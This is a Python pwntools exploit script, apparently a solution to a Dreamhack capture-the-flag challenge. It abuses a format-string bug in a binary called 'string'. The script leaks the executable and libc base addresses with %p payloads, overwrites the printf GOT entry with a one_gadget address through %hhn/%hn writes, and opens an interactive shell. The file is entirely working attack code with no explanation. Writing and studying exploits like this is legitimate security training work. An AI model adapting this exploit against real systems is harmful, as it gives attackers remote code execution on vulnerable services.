#!/usr/bin/env python3

from pwn import *

exe = ELF("string_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
ld = ELF("ld-2.23.so", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process(exe.path)
else:
    p = remote("host3.dreamhack.games", 11598)

one_gadget = 0x3a812

#stage 1 leak exe
p.sendlineafter(b'> ', b'1')
payload = f'%91$p'.encode()
p.sendlineafter(b'Input: ', payload)
p.sendlineafter(b'> ', b'2')
p.recvuntil(b": ")

exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x25c0
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

# stage 2 leak libc
p.sendlineafter(b'> ', b'1')
payload = f'%71$p'.encode()
p.sendlineafter(b'Input: ', payload)
p.sendlineafter(b'> ', b'2')
p.recvuntil(b": ")

libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x18637
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

#stage 3 write exe.got.printf
# input()
one_gadget += libc.address
log.info("one gadget: " + hex(one_gadget))
part1 = one_gadget & 0xff
part2 = one_gadget >> 8 & 0xffff
p.sendlineafter(b'> ', b'1')
payload = f'%{part1}c%11$hhn'.encode()
payload += f'%{part2 - part1}c%12$hn'.encode()
payload += p32(exe.got['printf'])
payload += p32(exe.got['printf'] + 1)
p.sendlineafter(b'Input: ', payload)
p.sendlineafter(b'> ', b'2')

# p.sendlineafter(b'> ', b'2')

p.interactive()

